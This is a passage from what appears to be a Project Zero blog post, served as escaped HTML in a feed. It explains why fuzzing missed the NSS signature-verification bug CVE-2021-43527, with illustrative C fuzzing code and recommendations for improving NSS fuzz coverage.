class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c12"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;cmd_handler_bar&lt;/span&gt;&lt;span class="c19"&gt;(&lt;/span&gt;&lt;span class="c12"&gt;int&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;a&lt;/span&gt;&lt;span class="c23 c21"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;size_t&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;b&lt;/span&gt;&lt;span class="c19"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;cmd_handler_foo&lt;/span&gt;&lt;span class="c19"&gt;(&lt;/span&gt;&lt;span class="c21 c38"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class="c23 c21"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;sizeof&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class="c19"&gt;)&lt;/span&gt;&lt;span class="c23 c21"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c12"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;cmd_handler_baz&lt;/span&gt;&lt;span class="c19"&gt;(&lt;/span&gt;&lt;span class="c12"&gt;int&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;a&lt;/span&gt;&lt;span class="c23 c21"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;size_t&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;b&lt;/span&gt;&lt;span class="c19"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;cmd_handler_bar&lt;/span&gt;&lt;span class="c19"&gt;(&lt;/span&gt;&lt;span class="c1"&gt;a&lt;/span&gt;&lt;span class="c23 c21"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;sizeof&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class="c19"&gt;)&lt;/span&gt;&lt;span class="c23 c21"&gt;;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1 c8"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c12"&gt;typedef&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;(&lt;/span&gt;&lt;span class="c23 c21"&gt;*&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;dispatch_t&lt;/span&gt;&lt;span class="c19"&gt;)(&lt;/span&gt;&lt;span class="c12"&gt;int&lt;/span&gt;&lt;span class="c23 c21"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;size_t&lt;/span&gt;&lt;span class="c19"&gt;)&lt;/span&gt;&lt;span class="c23 c21"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1 c8"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;dispatch_t handlers&lt;/span&gt;&lt;span class="c19"&gt;[&lt;/span&gt;&lt;span class="c1"&gt;UCHAR_MAX&lt;/span&gt;&lt;span class="c19"&gt;]&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23 c21"&gt;=&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&amp;nbsp; &amp;nbsp; cmd_handler_foo&lt;/span&gt;&lt;span class="c23 c21"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&amp;nbsp; &amp;nbsp; cmd_handler_bar&lt;/span&gt;&lt;span class="c23 c21"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&amp;nbsp; &amp;nbsp; cmd_handler_baz&lt;/span&gt;&lt;span class="c23 c21"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c19"&gt;}&lt;/span&gt;&lt;span class="c23 c21"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1 c8"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c12"&gt;int&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;main&lt;/span&gt;&lt;span class="c19"&gt;(&lt;/span&gt;&lt;span class="c12"&gt;int&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;argc&lt;/span&gt;&lt;span class="c21 c23"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;char&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23 c21"&gt;**&lt;/span&gt;&lt;span class="c1"&gt;argv&lt;/span&gt;&lt;span class="c19"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c19"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c12"&gt;int&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;cmd&lt;/span&gt;&lt;span class="c23 c21"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1 c8"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c21 c42"&gt;while&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;((&lt;/span&gt;&lt;span class="c1"&gt;cmd &lt;/span&gt;&lt;span class="c23 c21"&gt;=&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c28 c21"&gt;getchar&lt;/span&gt;&lt;span class="c19"&gt;())&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c23 c21"&gt;!=&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;EOF&lt;/span&gt;&lt;span class="c19"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c42 c21"&gt;if&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;(&lt;/span&gt;&lt;span class="c1"&gt;handlers&lt;/span&gt;&lt;span class="c19"&gt;[&lt;/span&gt;&lt;span class="c1"&gt;cmd&lt;/span&gt;&lt;span class="c19"&gt;])&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; handlers&lt;/span&gt;&lt;span class="c19"&gt;[&lt;/span&gt;&lt;span class="c1"&gt;cmd&lt;/span&gt;&lt;span class="c19"&gt;](&lt;/span&gt;&lt;span class="c21 c28"&gt;getchar&lt;/span&gt;&lt;span class="c19"&gt;()&lt;/span&gt;&lt;span class="c23 c21"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c28 c21"&gt;getchar&lt;/span&gt;&lt;span class="c19"&gt;())&lt;/span&gt;&lt;span class="c23 c21"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c19"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c19"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c19"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c29"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c3 c33 c16 subtitle" id="h.9a31y6u3z63v"&gt;&lt;span class="c32"&gt;Fig 4.&lt;/span&gt;&lt;span&gt;&amp;nbsp;The coverage &lt;/span&gt;&lt;span&gt;of command&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c32"&gt;bar&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a superset of command &lt;/span&gt;&lt;span class="c32"&gt;foo&lt;/span&gt;&lt;span&gt;, so an input containing the latter would be discarded during corpus minimization. There is a vulnerability unreachable via command &lt;/span&gt;&lt;span class="c32"&gt;bar &lt;/span&gt;&lt;span&gt;that might never be discovered. Stack coverage would correctly keep both inputs.&lt;/span&gt;&lt;sup&gt;&lt;a href="#ftnt1" id="ftnt_ref1" name="ftnt_ref1"&gt;[1]&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;To solve this problem, I&amp;rsquo;ve been experimenting with monitoring the call stack during execution.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;The naive implementation is too slow to be practical, but after a lot of optimization I had come up with a library that was fast enough to be integrated into coverage-guided fuzzing, and was testing how it performed with NSS and other libraries.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c13 c16" id="h.hx3w7e9emdvh"&gt;&lt;span class="c24 c8"&gt;Object Isolation&lt;/span&gt;&lt;/h2&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;Many data types are constructed from smaller records. PNG files are made of chunks, PDF files are made of streams, ELF files are made of sections, and X.509 certificates are made of ASN.1 TLV items. If a fuzzer has some understanding of the underlying format, it can isolate these records and extract the one(s) causing some new stack trace to be found.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;The fuzzer I was using is able to isolate and extract interesting new ASN.1 OIDs, SEQUENCEs, INTEGERs, and so on. Once extracted, it can then randomly combine or insert them into template data. This isn&amp;rsquo;t really a new idea, but is a new implementation. I&amp;#39;m planning to open source this code in the future.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c13 c16" id="h.eyoyd5te8xd4"&gt;&lt;span class="c24 c8"&gt;Do these approaches work?&lt;/span&gt;&lt;/h2&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;I wish that I could say that discovering this bug validates my ideas, but I&amp;rsquo;m not sure it does. I was doing some moderately novel fuzzing, but I see no reason this bug couldn&amp;rsquo;t have been found earlier with even rudimentary fuzzing techniques.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c13 c16" id="h.gjjikaq7urz2"&gt;&lt;span class="c24 c8"&gt;Lessons Learned&lt;/span&gt;&lt;/h2&gt; &lt;p class="c2"&gt;&lt;span class="c24 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;How did extensive, customized fuzzing with impressive coverage metrics fail to discover this bug?&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c13 c16" id="h.jjxdnfbzkeky"&gt;&lt;span class="c24 c8"&gt;What went wrong&lt;/span&gt;&lt;/h3&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h4 class="c13 c16" id="h.tq5bofk5duby"&gt;&lt;span&gt;Issue #1 &lt;/span&gt;&lt;span class="c35"&gt;Missing end-to-end testing&lt;/span&gt;&lt;span class="c6"&gt;.&lt;/span&gt;&lt;/h4&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;NSS is a &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/NSS_API_Guidelines"&gt;modular&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;library. This layered design is reflected in the &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://searchfox.org/nss/source/fuzz/"&gt;fuzzing&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;approach, as each component is fuzzed independently. For example, the &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/NSS_Tech_Notes/nss_tech_note1#how_to_use_the_nss_asn.1_and_quickder_decoders"&gt;QuickDER&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;decoder is tested &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://searchfox.org/nss/source/fuzz/quickder_target.cc"&gt;extensively&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but the fuzzer simply &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://searchfox.org/nss/rev/5f2fa238b58c9158a52c0681ca2a67958a353082/fuzz/quickder_target.cc#72"&gt;creates and discards&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c8"&gt;&amp;nbsp;objects and never uses them.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.f4e0f36d5a94fbada814aadd6ad3730de37e434f"&gt;&lt;/a&gt;&lt;a id="t.4"&gt;&lt;/a&gt;&lt;table class="c4"&gt;&lt;tbody&gt;&lt;tr class="c29"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;extern&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c21 c22"&gt;&amp;quot;C&amp;quot;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c5"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;LLVMFuzzerTestOneInput(&lt;/span&gt;&lt;span class="c5"&gt;const&lt;/span&gt;&lt;span class="c0 c8"&gt;&amp;nbsp;uint8_t *Data, size_t Size) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c5"&gt;char&lt;/span&gt;&lt;span class="c0 c8"&gt;&amp;nbsp;*dest[2048];&lt;/span&gt;&lt;/p&gt; &lt;p class="c31"&gt;&lt;span class="c0 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c5"&gt;for&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class="c5"&gt;auto&lt;/span&gt;&lt;span class="c0 c8"&gt;&amp;nbsp;tpl : templates) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0 c8"&gt;&amp;nbsp; &amp;nbsp;PORTCheapArenaPool pool;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp;SECItem buf = {siBuffer, &lt;/span&gt;&lt;span class="c5"&gt;const_cast&lt;/span&gt;&lt;span class="c0"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c5"&gt;unsigned&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c5"&gt;char&lt;/span&gt;&lt;span class="c0 c8"&gt;&amp;nbsp;*&amp;gt;(Data),&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c5"&gt;static_cast&lt;/span&gt;&lt;span class="c0"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c5"&gt;unsigned&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c5"&gt;int&lt;/span&gt;&lt;span class="c0 c8"&gt;&amp;gt;(Size)};&lt;/span&gt;&lt;/p&gt; &lt;p class="c31"&gt;&lt;span class="c0 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0 c8"&gt;&amp;nbsp; &amp;nbsp;PORT_InitCheapArena(&amp;amp;pool, DER_DEFAULT_CHUNKSIZE);&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp;(&lt;/span&gt;&lt;span class="c5"&gt;void&lt;/span&gt;&lt;span class="c0 c8"&gt;)SEC_QuickDERDecodeItem(&amp;amp;pool.arena, dest, tpl, &amp;amp;buf);&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c0 c8"&gt;&amp;nbsp; &amp;nbsp;PORT_DestroyCheapArena(&amp;amp;pool);&lt;/span&gt;&lt;/p&gt; &lt;p class="c34"&gt;&lt;span class="c0"&gt;&amp;nbsp;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c29"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c3 c16 subtitle" id="h.9rchnmg47ypy"&gt;&lt;span class="c32"&gt;Fig 5.&lt;/span&gt;&lt;span class="c8 c30"&gt;&amp;nbsp;The QuickDER fuzzer simply creates and discards objects. This verifies the ASN.1 parsing, but not whether other components handle the resulting objects correctly.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c2 c43"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;This fuzzer might have produced a &lt;/span&gt;&lt;span class="c21"&gt;SECKEYPublicKey&lt;/span&gt;&lt;span class="c11 c8"&gt;&amp;nbsp;that could have reached the vulnerable code, but as the result was never used to verify a signature, the bug could never be discovered.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h4 class="c13 c16" id="h.y3p8hf8j0qqo"&gt;&lt;span&gt;Issue #2 &lt;/span&gt;&lt;span class="c35"&gt;Arbitrary size limits&lt;/span&gt;&lt;span class="c6"&gt;.&lt;/span&gt;&lt;/h4&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;There is an arbitrary limit of &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://searchfox.org/nss/source/fuzz/options/quickder.options"&gt;10000 bytes&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c8"&gt;&amp;nbsp;placed on fuzzed input. There is no such limit within NSS; many structures can exceed this size. This vulnerability demonstrates that errors happen at extremes, so this limit should be chosen thoughtfully.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;A reasonable choice might be 2&lt;/span&gt;&lt;span class="c20"&gt;24&lt;/span&gt;&lt;span&gt;-1 bytes, the &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://datatracker.ietf.org/doc/html/rfc8446#section-4.4.2"&gt;largest possible&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c8"&gt;&amp;nbsp;certificate that can be presented by a server during a TLS handshake negotiation.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;While NSS might handle objects even larger than this, TLS cannot possibly be involved, reducing the overall severity of any vulnerabilities missed.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h4 class="c13 c16" id="h.fny13amxfoss"&gt;&lt;span&gt;Issue #3 &lt;/span&gt;&lt;span class="c35"&gt;Misleading metrics&lt;/span&gt;&lt;span class="c6"&gt;.&lt;/span&gt;&lt;/h4&gt; &lt;p class="c2"&gt;&lt;span class="c11 c46"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;All of the NSS fuzzers are represented in combined coverage metrics by oss-fuzz, rather than their individual coverage. This data proved misleading, as the vulnerable code is fuzzed extensively but by fuzzers that could not possibly generate a relevant input.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;This is because fuzzers like the &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://searchfox.org/nss/source/fuzz/tls_server_target.cc"&gt;tls_server_target&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;use fixed, &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://searchfox.org/nss/source/fuzz/tls_server_certs.cc"&gt;hardcoded&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c8"&gt;&amp;nbsp;certificates. This exercises code relevant to certificate verification, but only fuzzes TLS messages and protocol state changes.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c13 c16" id="h.5iljytmv85wn"&gt;&lt;span class="c24 c8"&gt;What Worked&lt;/span&gt;&lt;/h3&gt; &lt;p class="c2"&gt;&lt;span class="c24 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_4idwybng3hbx-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;The design of the mozilla::pkix validation library prevented this bug from being worse than it could have been. &lt;/span&gt;&lt;span class="c11 c8"&gt;Unfortunately it is unused outside of Firefox and Thunderbird.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;It&amp;rsquo;s debatable whether this was just good fortune or not. It seems likely RSA-PSS would eventually be permitted by mozilla::pkix, even though it was not today.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c8 c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c13 c16" id="h.t0ijbutqkb5h"&gt;&lt;span class="c8 c24"&gt;Recommendations&lt;/span&gt;&lt;/h2&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;This issue demonstrates that even extremely well-maintained C/C++ can have fatal, trivial mistakes.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c13 c16" id="h.yesvwttsgrsf"&gt;&lt;span class="c24 c8"&gt;Short Term&lt;/span&gt;&lt;/h3&gt; &lt;p class="c2"&gt;&lt;span class="c24 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_x7i5vtjupm2f-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;Raise the maximum size of ASN.1 objects produced by libFuzzer from 10,000 to 2&lt;/span&gt;&lt;span class="c20"&gt;24&lt;/span&gt;&lt;span class="c11 c8"&gt;-1 = 16,777,215 &amp;nbsp;bytes.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_wy7koemfbmv1-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span class="c11 c8"&gt;The QuickDER fuzzer should call some relevant APIs with any objects successfully created before destroying them.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;The oss-fuzz code coverage metrics should be divided by fuzzer, not by project.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c13 c16" id="h.i49j9otzq1oi"&gt;&lt;span class="c24 c8"&gt;Solution&lt;/span&gt;&lt;/h1&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;This vulnerability is &lt;/span&gt;&lt;span&gt;CVE-2021-43527,&lt;/span&gt;&lt;span&gt;&amp;nbsp;and is resolved in &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://www.mozilla.org/en-US/security/advisories/"&gt;NSS 3.73.0&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c8"&gt;. If you are a vendor that distributes NSS in your products, you will most likely need to update or backport the patch.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c13 c16" id="h.9canxlbf0rtp"&gt;&lt;span class="c24 c8"&gt;Credits&lt;/span&gt;&lt;/h1&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;I would not have been able to find this bug without assistance from my colleagues from Ch&lt;/span&gt;&lt;span&gt;rome, Ryan S&lt;/span&gt;&lt;span class="c11 c8"&gt;leevi and David Benjamin, who helped answer my ASN.1 encoding questions and engaged in thoughtful discussion on the topic.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;Thanks to the NSS team, who helped triage and analyze the vulnerability.&lt;/span&gt;&lt;/p&gt;&lt;hr class="c44"&gt;&lt;div&gt; &lt;p class="c3 c33"&gt;&lt;a href="#ftnt_ref1" id="ftnt1" name="ftnt1"&gt;[1]&lt;/a&gt;&lt;span class="c8 c36 c47"&gt;&amp;nbsp;In this minimal example, a workaround if source was available would be to use a combination of sancov&amp;#39;s data-flow instrumentation options, but that also fails on more complex variants.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/7868790017880077590/comments/default" title="Post Comments" />
